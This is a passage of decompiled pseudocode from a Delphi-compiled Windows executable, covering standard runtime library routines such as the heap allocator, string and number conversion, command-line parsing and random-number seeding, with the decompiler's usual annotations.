    }
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00401DCC) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall System::_16448_0@<al>(unsigned int *a1@<eax>)
{
  unsigned int v1; // ebx
  int v3; // eax
  int v4; // esi
  int v5; // eax
  unsigned int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int v7; // [esp+4h] [ebp-18h]
  unsigned int v8; // [esp+8h] [ebp-14h] BYREF
  int v9; // [esp+Ch] [ebp-10h]

  v6 = *a1;
  v7 = a1[1];
  System::_16447();
  System::_16426(dword_41E48C, (int *)&v6, (int *)&v8);
  v1 = v8;
  if ( !v8 )
    return 0;
  if ( v8 < v6 )
  {
    v3 = System::_16443(v6);
    v6 -= v3;
    v7 += v3;
  }
  v4 = v9 + v1;
  if ( v7 + v6 < v9 + v1 )
  {
    v5 = System::_16444((int *)(v7 + v6));
    v7 += v5;
  }
  if ( v4 == v7 + v6 )
  {
    System::_16440((unsigned int *)(v7 + v6 - 4), 4);
    v7 -= 4;
  }
  dword_41E484 = v6;
  dword_41E480 = v7;
  return 1;
}
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00401E58) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16449_0@<eax>(int a1@<eax>)
{
  int result; // eax
  int v2[3]; // [esp+0h] [ebp-Ch] BYREF

  System::_16433(a1 + 4, v2);
  if ( !v2[0] || !System::_16448_0((unsigned int *)v2) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401E84) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16450@<eax>(void *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  unsigned int v4[4]; // [esp+0h] [ebp-10h] BYREF

  System::_16434(v4, a1, a2 + 4);
  if ( !v4[0] || !System::_16448_0(v4) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401EB8) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16451@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // eax

  v1 = 0;
  v2 = a1 / 4;
  if ( v2 <= 1024 )
  {
    do
    {
      v1 = *((_DWORD *)hMem + v2 - 3);
      if ( v1 )
        break;
      ++v2;
    }
    while ( v2 != 1025 );
  }
  return v1;
}

//----- (00401EE4) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall System::_16452@<eax>(int a1@<eax>)
{
  int *v2; // ebx
  int v3; // eax
  _DWORD *result; // eax
  int *v5; // eax
  int v6; // edx

  do
  {
    v2 = (int *)dword_41E474;
    if ( a1 <= *(_DWORD *)(dword_41E474 + 8) )
      goto LABEL_15;
    v2 = (int *)dword_41E47C;
    v3 = *(_DWORD *)(dword_41E47C + 8);
    if ( a1 <= v3 )
      goto LABEL_15;
    *(_DWORD *)(dword_41E47C + 8) = a1;
    do
      v2 = (int *)v2[1];
    while ( a1 > v2[2] );
    *(_DWORD *)(dword_41E47C + 8) = v3;
    if ( v2 != (int *)dword_41E47C )
    {
      dword_41E47C = (int)v2;
LABEL_15:
      System::_16438(v2);
      if ( v2[2] - a1 < 12 )
      {
        v6 = v2[2];
        a1 = v6;
        if ( v2 == (int *)dword_41E47C )
          dword_41E47C = v2[1];
        *(int *)((char *)v2 + v6) &= 0xFFFFFFFE;
      }
      else
      {
        System::_16446((unsigned int *)((char *)v2 + a1), v2[2] - a1);
      }
      *v2 = a1 | 2;
      result = v2 + 1;
      ++dword_41E41C;
      dword_41E420 += a1 - 4;
      return result;
    }
    if ( a1 <= 4096 )
    {
      v2 = (int *)System::_16451(a1);
      if ( v2 )
        goto LABEL_15;
    }
    if ( !(unsigned __int8)System::_16449_0(a1) )
      return 0;
  }
  while ( a1 > dword_41E480 );
  dword_41E480 -= a1;
  if ( dword_41E480 < 12 )
  {
    a1 += dword_41E480;
    dword_41E480 = 0;
  }
  v5 = (int *)dword_41E484;
  dword_41E484 += a1;
  *v5 = a1 | 2;
  result = v5 + 1;
  ++dword_41E41C;
  dword_41E420 += a1 - 4;
  return result;
}
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E474: using guessed type int dword_41E474;
// 41E47C: using guessed type int dword_41E47C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00401FD8) --------------------------------------------------------
_DWORD *__usercall System::SysGetMem@<eax>(int a1@<eax>)
{
  int v3; // ebx
  int *v4; // edx
  int *v5; // esi
  int *v6; // eax
  int *v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-Ch] [ebp-20h] BYREF
  void *v10; // [esp-8h] [ebp-1Ch]
  int *v11; // [esp-4h] [ebp-18h]
  int v12; // [esp+Ch] [ebp-8h]
  _DWORD *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( !byte_41E428 && !System::_16436() )
    return 0;
  v11 = &savedregs;
  v10 = &loc_40214C;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  v3 = (a1 + 7) & 0xFFFFFFFC;
  if ( v3 < 12 )
    v3 = 12;
  if ( v3 <= 4096 && (v4 = (int *)*((_DWORD *)hMem + (v3 >> 2) - 3)) != 0 )
  {
    v5 = (int *)*((_DWORD *)hMem + (v3 >> 2) - 3);
    *(int *)((char *)v4 + v3) &= 0xFFFFFFFE;
    v6 = (int *)v4[1];
    if ( v4 == v6 )
    {
      *((_DWORD *)hMem + (v3 >> 2) - 3) = 0;
    }
    else
    {
      *((_DWORD *)hMem + (v3 >> 2) - 3) = v6;
      v12 = *v4;
      *(_DWORD *)(v12 + 4) = v6;
      *v6 = v12;
    }
    *v5 = v4[2] | 2;
    v13 = v5 + 1;
    ++dword_41E41C;
    dword_41E420 += v3 - 4;
    sub_403038((unsigned int)v9, (int)v10, (int)v11);
  }
  else if ( v3 > dword_41E480 )
  {
    v13 = System::_16452(v3);
    __writefsdword(0, (unsigned int)v9);
    v11 = (int *)&loc_402153;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
  }
  else
  {
    dword_41E480 -= v3;
    if ( dword_41E480 < 12 )
    {
      v3 += dword_41E480;
      dword_41E480 = 0;
    }
    v7 = (int *)dword_41E484;
    dword_41E484 += v3;
    *v7 = v3 | 2;
    v13 = v7 + 1;
    ++dword_41E41C;
    dword_41E420 += v3 - 4;
    sub_403038((unsigned int)v9, (int)v10, (int)v11);
  }
  return v13;
}
// 402040: conditional instruction was optimized away because of 'ebx.4 in (C..1000)'
// 40206A: conditional instruction was optimized away because of 'ebx.4 in (C..1000)'
// 402084: conditional instruction was optimized away because of 'ebx.4 in (C..1000)'
// 41E041: using guessed type char byte_41E041;
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E428: using guessed type char byte_41E428;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00402160) --------------------------------------------------------
int __usercall System::SysFreeMem@<eax>(int a1@<eax>)
{
  unsigned int *v2; // esi
  int v3; // ebx
  int v4; // edx
  _DWORD *v5; // eax
  int v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-Ch] [ebp-1Ch] BYREF
  void *v12; // [esp-8h] [ebp-18h]
  int *v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  dword_41E42C = 0;
  if ( !byte_41E428 && !System::_16436() )
  {
    dword_41E42C = 8;
    return 8;
  }
  v13 = &savedregs;
  v12 = &loc_4022F2;
  v11 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  v2 = (unsigned int *)(a1 - 4);
  v3 = *(_DWORD *)(a1 - 4);
  if ( (v3 & 2) == 0 )
  {
    dword_41E42C = 9;
    goto LABEL_29;
  }
  --dword_41E41C;
  dword_41E420 -= (v3 & 0x7FFFFFFC) - 4;
  if ( (v3 & 1) != 0 )
  {
    v4 = *(v2 - 1);
    if ( v4 < 12 || (v4 & 0x80000003) != 0 )
    {
      dword_41E42C = 10;
      goto LABEL_29;
    }
    v5 = (unsigned int *)((char *)v2 - v4);
    if ( v4 != *(unsigned int *)((char *)v2 - v4 + 8) )
    {
      dword_41E42C = 10;
      goto LABEL_29;
    }
    v3 += v4;
    v2 = (unsigned int *)((char *)v2 - v4);
    System::_16438(v5);
  }
  v6 = v3 & 0x7FFFFFFC;
  v7 = (unsigned int *)((char *)v2 + v6);
  v8 = (unsigned int *)((char *)v2 + v6);
  if ( (unsigned int *)((char *)v2 + v6) != (unsigned int *)dword_41E484 )
  {
    if ( (*v7 & 2) != 0 )
    {
      if ( (*v7 & 0x7FFFFFFCu) < 4 )
      {
        dword_41E42C = 11;
        goto LABEL_29;
      }
      *v7 |= 1u;
    }
    else
    {
      v9 = (unsigned int *)((char *)v2 + v6);
      if ( !v8[1] || !*v8 || (int)v8[2] < 12 )
      {
        dword_41E42C = 11;
        goto LABEL_29;
      }
      v6 += v8[2];
      System::_16438(v9);
    }
    System::_16446(v2, v6);
LABEL_29:
    v14 = dword_41E42C;
    __writefsdword(0, (unsigned int)v11);
    v13 = (int *)&loc_4022F9;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
    return v14;
  }
  dword_41E484 -= v6;
  dword_41E480 += v6;
  if ( dword_41E480 > 15360 )
    System::_16447();
  v14 = 0;
  sub_403038((unsigned int)v11, (int)v12, (int)v13);
  return v14;
}
// 41E041: using guessed type char byte_41E041;
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;
// 41E428: using guessed type char byte_41E428;
// 41E42C: using guessed type int dword_41E42C;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (00402304) --------------------------------------------------------
// Borland Visual Component Library & Packages
unsigned int __usercall System::_16466@<eax>(int a1@<eax>, int a2@<edx>)
{
  signed int v2; // esi
  unsigned int *v3; // ebp
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ebx
  unsigned int result; // eax
  int v8; // [esp+0h] [ebp-18h]
  int v9; // [esp+0h] [ebp-18h]
  int v10; // [esp+0h] [ebp-18h]
  int v11; // [esp+4h] [ebp-14h]

  v2 = (a2 + 7) & 0xFFFFFFFC;
  if ( v2 < 12 )
    v2 = 12;
  v3 = (unsigned int *)(a1 - 4);
  v4 = *(_DWORD *)(a1 - 4) & 0x7FFFFFFC;
  v5 = (_DWORD *)(v4 + a1 - 4);
  v6 = v5;
  if ( v4 < v2 )
  {
    while ( 1 )
    {
      v11 = v2 - v4;
      if ( v6 == (_DWORD *)dword_41E484 )
      {
        if ( dword_41E480 >= v11 )
        {
          dword_41E480 -= v11;
          dword_41E484 += v11;
          if ( dword_41E480 < 12 )
          {
            dword_41E484 += dword_41E480;
            v2 += dword_41E480;
            dword_41E480 = 0;
          }
          dword_41E420 += v2 - v4;
          result = *v3 & 0x80000003;
          *v3 = result | v2;
          LOBYTE(result) = 1;
          return result;
        }
        System::_16447();
        v6 = (unsigned int *)((char *)v3 + v4);
      }
      if ( (*(_BYTE *)v6 & 2) == 0 )
      {
        v9 = v6[2];
        if ( v9 >= v11 )
        {
          System::_16438(v6);
          v10 = v9 - v11;
          if ( v10 < 12 )
          {
            v2 += v10;
            *(unsigned int *)((char *)v3 + v2) &= 0xFFFFFFFE;
          }
          else
          {
            System::_16446((unsigned int *)((char *)v3 + v2), v10);
          }
          goto LABEL_28;
        }
        v6 = (_DWORD *)((char *)v6 + v9);
        v11 -= v9;
      }
      if ( (int)*v6 >= 0 || !(unsigned __int8)System::_16450((char *)v6 + (*v6 & 0x7FFFFFFC), v11) )
        return 0;
      v6 = (unsigned int *)((char *)v3 + v4);
    }
  }
  v8 = v4 - v2;
  if ( v5 == (_DWORD *)dword_41E484 )
  {
    dword_41E484 -= v8;
    dword_41E480 += v8;
    if ( dword_41E480 < 12 )
    {
      dword_41E484 += v8;
      dword_41E480 -= v8;
      v2 = v4;
    }
  }
  else
  {
    if ( (*(_BYTE *)v5 & 2) == 0 )
    {
      v8 += v5[2];
      System::_16438(v5);
    }
    if ( v8 < 12 )
    {
      v2 = v4;
    }
    else
    {
      *(unsigned int *)((char *)v3 + v2) = v8 | 2;
      System::_16441((int)v3 + v2 + 4);
    }
  }
LABEL_28:
  dword_41E420 += v2 - v4;
  result = *v3 & 0x80000003;
  *v3 = result | v2;
  LOBYTE(result) = 1;
  return result;
}
// 41E420: using guessed type int dword_41E420;
// 41E480: using guessed type int dword_41E480;
// 41E484: using guessed type int dword_41E484;

//----- (004024D4) --------------------------------------------------------
int __usercall System::SysReallocMem@<eax>(int a1@<edx>, BYTE *a2@<eax>)
{
  BYTE *v5; // edi
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v9; // [esp-4h] [ebp-14h]
  BYTE *v10; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  if ( !byte_41E428 && !System::_16436() )
    return 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_402585;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  if ( (unsigned __int8)System::_16466((int)a2, a1) )
  {
    v10 = a2;
  }
  else
  {
    v5 = (BYTE *)System::SysGetMem(a1);
    v6 = (*((_DWORD *)a2 - 1) & 0x7FFFFFFC) - 4;
    if ( a1 < v6 )
      v6 = a1;
    if ( v5 )
    {
      Move(a2, v5, v6);
      System::SysFreeMem((int)a2);
    }
    v10 = v5;
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_40258C;
  if ( byte_41E041 )
    LeaveCriticalSection(&CriticalSection);
  return (int)v10;
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;

//----- (00402598) --------------------------------------------------------
#error "40259C: call analysis failed (funcsize=8)"

//----- (004025B0) --------------------------------------------------------
int __usercall sub_4025B0@<eax>(int result@<eax>)
{
  if ( result )
  {
    result = off_41C020();
    if ( result )
      System::_16468(2);
  }
  return result;
}
// 41C020: using guessed type int (*off_41C020)(void);

//----- (004025C8) --------------------------------------------------------
void __usercall __linkproc__ ReallocMem(void **a@<eax>, int b@<edx>)
{
  int v2; // eax
  int v3; // eax
  int *v4; // [esp-4h] [ebp-4h]
  int *v5; // [esp-4h] [ebp-4h]

  if ( *a )
  {
    if ( b )
    {
      v2 = off_41C024(a);
      if ( v2 )
      {
        *v4 = v2;
        return;
      }
LABEL_8:
      System::_16468(1);
    }
    *a = 0;
    if ( off_41C020() )
      System::_16468(2);
  }
  else if ( b )
  {
    v3 = off_41C01C(a);
    if ( !v3 )
      goto LABEL_8;
    *v5 = v3;
  }
}
// 4025E0: variable 'v4' is possibly undefined
// 402612: variable 'v5' is possibly undefined
// 41C01C: using guessed type int (__cdecl *off_41C01C)(_DWORD);
// 41C020: using guessed type int (*off_41C020)(void);
// 41C024: using guessed type int (__cdecl *off_41C024)(_DWORD);

//----- (00402618) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn System::_16468(char a1@<al>)
{
  int v1; // eax
  bool v2; // sf
  int v3; // eax

  v1 = a1 & 0x7F;
  if ( dword_41E004 )
    v1 = ((int (*)(void))dword_41E004)();
  v3 = v1 - 1;
  v2 = v3 < 0;
  LOBYTE(v3) = byte_402641[v3];
  if ( v2 )
    v3 = *((_DWORD *)__linkproc__ GetTls() + 1);
  sub_4034BC(v3);
}
// 402626: positive sp value 4 has been found
// 41E004: using guessed type int dword_41E004;

//----- (0040265C) --------------------------------------------------------
void __spoils<ecx> sub_40265C()
{
  if ( *((_DWORD *)__linkproc__ GetTls() + 1) )
    System::_16468(0);
}

//----- (0040267C) --------------------------------------------------------
_DWORD *__usercall sub_40267C@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = __linkproc__ GetTls();
  result[1] = a1;
  return result;
}

//----- (00402698) --------------------------------------------------------
int sub_402698()
{
  _DWORD *v0; // eax
  int v1; // ecx

  v0 = __linkproc__ GetTls();
  v1 = v0[1];
  v0[1] = 0;
  return v1;
}

//----- (004026B0) --------------------------------------------------------
int __usercall Move@<eax>(BYTE *a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>)
{
  int result; // eax
  int v5; // ecx
  BYTE *v6; // esi
  BYTE *v7; // edi
  int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // esi
  _BYTE *v11; // edi

  result = a3;
  if ( a2 > a1 )
  {
    v6 = &a1[a3 - 4];
    v7 = &a2[a3 - 4];
    v8 = a3 >> 2;
    if ( v8 >= 0 )
    {
      while ( v8 )
      {
        *(_DWORD *)v7 = *(_DWORD *)v6;
        v6 -= 4;
        v7 -= 4;
        --v8;
      }
      v9 = result & 3;
      v10 = v6 + 3;
      v11 = v7 + 3;
      while ( v9 )
      {
        *v11-- = *v10--;
        --v9;
      }
    }
  }
  else if ( a2 != a1 )
  {
    v5 = a3 >> 2;
    if ( v5 >= 0 )
      qmemcpy(a2, a1, 4 * v5 + (result & 3));
  }
  return result;
}

//----- (004026F0) --------------------------------------------------------
BYTE *__usercall System::_16481@<eax>(BYTE *a1@<eax>, BYTE **a2@<edx>)
{
  BYTE *i; // ebx
  int v4; // eax
  BYTE v5; // dl
  BYTE v6; // dl
  BYTE v8[4104]; // [esp+0h] [ebp-1008h] BYREF

  *(_DWORD *)v8 = a1;
  for ( i = a1; ; i += 2 )
  {
    while ( *i && *i <= 0x20u )
      ++i;
    if ( *i != 34 || i[1] != 34 )
      break;
  }
  v4 = 0;
  while ( 1 )
  {
    v6 = *i;
    if ( *i <= 0x20u || v4 >= 4096 )
      break;
    if ( v6 == 34 )
    {
      ++i;
      while ( 1 )
      {
        v5 = *i;
        if ( !*i || v5 == 34 )
          break;
        v8[v4++] = v5;
        ++i;
      }
      if ( *i )
        ++i;
    }
    else
    {
      v8[v4++] = v6;
      ++i;
    }
  }
  __linkproc__ LStrFromPCharLen(a2, v8, v4);
  return i;
}

//----- (00402768) --------------------------------------------------------
void __usercall ParamStr(int a1@<eax>, BYTE **a2@<edx>)
{
  int v3; // ebx
  int v4; // eax
  BYTE *v5; // edi
  CHAR Filename[276]; // [esp+0h] [ebp-114h] BYREF

  v3 = a1;
  if ( a1 )
  {
    v5 = (BYTE *)GetCommandLineA();
    while ( 1 )
    {
      v5 = System::_16481(v5, a2);
      if ( !v3 || !*a2 )
        break;
      --v3;
    }
  }
  else
  {
    v4 = GetModuleFileNameA(0, Filename, 0x105u);
    __linkproc__ LStrFromPCharLen(a2, (BYTE *)Filename, v4);
  }
}

//----- (004027C0) --------------------------------------------------------
int Randomize()
{
  int v0; // eax
  int result; // eax
  struct _SYSTEMTIME SystemTime; // [esp+0h] [ebp-18h] BYREF

  GetSystemTime(&SystemTime);
  v0 = 60 * SystemTime.wHour;
  LOWORD(v0) = SystemTime.wMinute + v0;
  result = SystemTime.wMilliseconds + 1000 * (SystemTime.wSecond + 60 * v0);
  dword_41E03C = result;
  return result;
}
// 41E03C: using guessed type int dword_41E03C;

//----- (004027FC) --------------------------------------------------------
void __noreturn sub_4027FC()
{
  if ( dword_41E018 )
    dword_41E018();
  sub_4034BC(210);
}
// 4027FC: using guessed type void __noreturn sub_4027FC();
// 41E018: using guessed type int (*dword_41E018)(void);

//----- (00402818) --------------------------------------------------------
unsigned __int8 __usercall __linkproc__ PStrNCat@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, unsigned __int8 a3@<cl>)
{
  unsigned __int8 v4; // al
  unsigned int v6; // edx
  const void *v7; // esi
  bool v8; // cf
  unsigned __int8 result; // al
  unsigned int v10; // ecx
  bool v11; // cc
  char v12; // cl

  v4 = *a1;
  v6 = *a2;
  v7 = a2 + 1;
  v8 = __CFADD__((_BYTE)v6, v4);
  result = v6 + v4;
  if ( !v8 && result <= a3 )
    goto LABEL_3;
  result = a3;
  v11 = a3 <= *a1;
  v12 = a3 - *a1;
  if ( !v11 )
  {
    LOBYTE(v6) = v12;
LABEL_3:
    v10 = v6;
    LOBYTE(v6) = *a1;
    *a1 = result;
    qmemcpy(&a1[v6 + 1], v7, v10);
  }
  return result;
}

//----- (00402848) --------------------------------------------------------
int __usercall sub_402848@<eax>(char *a1@<eax>, _BYTE *a2@<edx>)
{
  unsigned int v3; // ecx
  int result; // eax

  v3 = ((unsigned int)(unsigned __int8)*a2 + 1) >> 2;
  result = (*a2 + 1) & 3;
  qmemcpy(a1, a2, 4 * v3);
  qmemcpy(&a1[4 * v3], &a2[4 * v3], result);
  return result;
}

//----- (00402864) --------------------------------------------------------
int __usercall System::__linkproc__ AStrCmp@<eax>(int result@<eax>, int a2@<edx>, unsigned int a3@<ecx>)
{
  unsigned int v3; // esi
  unsigned int v4; // esi

  v3 = a3 >> 2;
  if ( a3 >> 2 )
  {
    while ( *(_DWORD *)result == *(_DWORD *)a2 )
    {
      v4 = v3 - 1;
      if ( !v4 )
      {
        result += 4;
        a2 += 4;
        goto LABEL_8;
      }
      if ( *(_DWORD *)(result + 4) != *(_DWORD *)(a2 + 4) )
        return result;
      result += 8;
      a2 += 8;
      v3 = v4 - 1;
      if ( !v3 )
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    if ( (a3 & 3) != 0
      && *(_BYTE *)result == *(_BYTE *)a2
      && ((a3 & 3) == 1
       || *(_BYTE *)(result + 1) == *(_BYTE *)(a2 + 1)
       && ((a3 & 3) == 2 || *(_BYTE *)(result + 2) == *(_BYTE *)(a2 + 2))) )
    {
      result = 0;
    }
  }
  return result;
}

//----- (004028D4) --------------------------------------------------------
__int16 __usercall sub_4028D4@<ax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // eax
  int v5; // ecx

  BYTE1(a3) = a3;
  v4 = a3 << 16;
  LOWORD(v4) = a3;
  v5 = a2 >> 2;
  if ( a2 >> 2 >= 0 )
  {
    memset32(a1, v4, v5);
    memset(&a1[4 * v5], v4, a2 & 3);
  }
  return v4;
}

//----- (004028F4) --------------------------------------------------------
int __usercall sub_4028F4@<eax>(unsigned int a1@<eax>)
{
  dword_41E03C = 134775813 * dword_41E03C + 1;
  return ((unsigned int)dword_41E03C * (unsigned __int64)a1) >> 32;
}
// 41E03C: using guessed type int dword_41E03C;

//----- (0040290C) --------------------------------------------------------
char __usercall System::__linkproc__ StrLong@<al>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>)
{
  unsigned int v4; // eax
  int v5; // ebx
  unsigned int v6; // et2
  char *v7; // edi
  int v8; // ecx
  bool v9; // cc
  unsigned int v10; // ecx
  char result; // al
  char v12[21]; // [esp+1h] [ebp-25h]
  int v13; // [esp+16h] [ebp-10h]

  v13 = a2;
  v4 = abs32(a1);
  v5 = 0;
  do
  {
    v6 = v4 % 0xA;
    v4 /= 0xAu;
    v12[++v5] = v6 + 48;
  }
  while ( v4 );
  if ( a1 < 0 )
    v12[++v5] = 45;
  *a3 = v5;
  v7 = a3 + 1;
  v8 = v13;
  if ( v13 > 255 )
    v8 = 255;
  v9 = v8 <= v5;
  v10 = v8 - v5;
  if ( !v9 )
  {
    *(v7 - 1) += v10;
    memset(v7, 32, v10);
    v7 += v10;
  }
  do
  {
    result = v12[v5];
    *v7++ = result;
    --v5;
  }
  while ( v5 );
  return result;
}

//----- (0040296C) --------------------------------------------------------
char __usercall sub_40296C@<al>(int a1@<eax>, _BYTE *a2@<edx>)
{
  return System::__linkproc__ StrLong(a1, 0, a2);
}

//----- (00402978) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall System::__linkproc__ ValLong@<eax>(int result@<eax>, char **a2@<edx>)
{
  char *v2; // esi
  int v3; // ebx
  char v4; // bl
  char v5; // ch
  char *v6; // esi
  unsigned __int8 v7; // bl
  unsigned __int8 v8; // bl
  int v9; // [esp-4h] [ebp-10h]

  v2 = (char *)result;
  v9 = result;
  if ( !result )
  {
LABEL_22:
    ++v2;
    goto LABEL_25;
  }
  result = 0;
  v3 = 0;
  do
    v4 = *v2++;
  while ( v4 == 32 );
  v5 = 0;
  switch ( v4 )
  {
    case '-':
      v5 = 1;
      goto LABEL_27;
    case '+':
LABEL_27:
      v4 = *v2++;
      goto LABEL_14;
    case '$':
    case 'x':
    case 'X':
LABEL_28:
      v7 = *v2++;
      if ( v7 )
      {
        while ( 1 )
        {
          if ( v7 >= 0x61u )
            v7 -= 32;
          LOBYTE(v3) = v7 - 48;
          if ( (unsigned __int8)v3 > 9u )
          {
            v8 = v3 - 17;
            if ( v8 > 5u )
              goto LABEL_25;
            LOBYTE(v3) = v8 + 10;
          }
          if ( (unsigned int)result > 0xFFFFFFF )
            goto LABEL_25;
          result = v3 + 16 * result;
          v7 = *v2++;
          if ( !v7 )
            goto LABEL_20;
        }
      }
      goto LABEL_22;
  }
  if ( v4 != 48 )
  {
LABEL_14:
    if ( v4 )
    {
LABEL_15:
      while ( 1 )
      {
        LOBYTE(v3) = v4 - 48;
        if ( (unsigned __int8)v3 > 9u || (unsigned int)result > 0xCCCCCCC )
          break;
        result = v3 + 10 * result;
        v4 = *v2++;
        if ( !v4 )
          goto LABEL_18;
      }
    }
    goto LABEL_25;
  }
  v4 = *v2++;
  if ( v4 == 120 || v4 == 88 )
    goto LABEL_28;
  if ( v4 )
    goto LABEL_15;
LABEL_18:
  if ( v5 == 1 )
  {
    result = -result;
    if ( result < 1 || result == 0 || result < 0 )
      goto LABEL_20;
LABEL_25:
    v6 = &v2[-v9];
    goto LABEL_21;
  }
  if ( result < 0 )
    goto LABEL_25;
LABEL_20:
  v6 = 0;
LABEL_21:
  *a2 = v6;
  return result;
}

//----- (00402A44) --------------------------------------------------------
_BYTE *__usercall sub_402A44@<eax>(_BYTE *result@<eax>, char *a2@<edx>, char a3@<cl>)
{
  char v3; // ch

  do
  {
    v3 = *a2++;
    *result++ |= v3;
    --a3;
  }
  while ( a3 );
  return result;
}

//----- (00402A58) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int System::_16736()
{
  int v0; // ebx
  int v1; // eax

  v0 = 0;
  if ( GetKeyboardType(0) == 7 )
  {
    v1 = GetKeyboardType(1) & 0xFF00;
    if ( v1 == 3328 || v1 == 1024 )
      LOBYTE(v0) = 1;
  }
  return v0;
}

//----- (00402A88) --------------------------------------------------------
__int16 System::_16541()
{
  __int16 result; // ax
  unsigned int v1[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v2; // [esp-4h] [ebp-10h]
  DWORD cbData; // [esp+0h] [ebp-Ch] BYREF
  BYTE Data[4]; // [esp+4h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  *(_DWORD *)Data = (unsigned __int16)word_41C000;
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Borland\\Delphi\\RTL", 0, 1u, &phkResult) )
  {
    v2 = &savedregs;
    v1[1] = (unsigned int)&loc_402AF9;
    v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v1);
    cbData = 4;
    RegQueryValueExA(phkResult, "FPUMaskValue", 0, 0, Data, &cbData);
    __writefsdword(0, v1[0]);
    v2 = (int *)&loc_402B00;
    RegCloseKey(phkResult);
  }
  result = Data[0] & 0x3F | word_41C000 & 0xFFC0;
  word_41C000 = result;
  return result;
}
// 41C000: using guessed type __int16 word_41C000;

//----- (00402B4C) --------------------------------------------------------
void sub_402B4C()
{
  __asm { fninit }
}

//----- (00402B58) --------------------------------------------------------
int __usercall sub_402B58@<eax>(int a1@<eax>)
{
  return *(_DWORD *)a1;
}

//----- (00402B5C) --------------------------------------------------------
int __usercall sub_402B5C@<eax>(int result@<eax>, void *a2@<edx>)
{
  qmemcpy(a2, *(const void **)(result - 44), **(unsigned __int8 **)(result - 44) + 1);
  return result;
}

//----- (00402B70) --------------------------------------------------------
_DWORD *__usercall sub_402B70@<eax>(int a1@<eax>)
{
  _DWORD *v1; // eax

  v1 = (_DWORD *)sub_402598(*(_DWORD *)(a1 - 40));
  return System::TObject::InitInstance(a1, v1);
}

//----- (00402B84) --------------------------------------------------------
int __usercall System::TObject::FreeInstance@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int *v3; // esi
  int v4; // esi
  int v5; // edx

  v2 = a1;
  v3 = (int *)a1;
  do
  {
    v4 = *v3;
    v5 = *(_DWORD *)(v4 - 64);
    v3 = *(int **)(v4 - 36);
    if ( v5 )
    {
      System::__linkproc__ FinalizeRecord(a1, v5);
      a1 = v2;
    }
  }
  while ( v3 );
  return sub_4025B0(a1);
}

//----- (00402BAC) --------------------------------------------------------
void __usercall TObject_Create(void *TObject_Self@<eax>)
{
  char v1; // dl
  char v2; // [esp-10h] [ebp-10h]

  if ( v1 )
    TObject_Self = (void *)System::__linkproc__ ClassCreate((int)TObject_Self, v1, v2);
  if ( v1 )
    sub_402D34(TObject_Self);
}
// 402BAE: variable 'v1' is possibly undefined
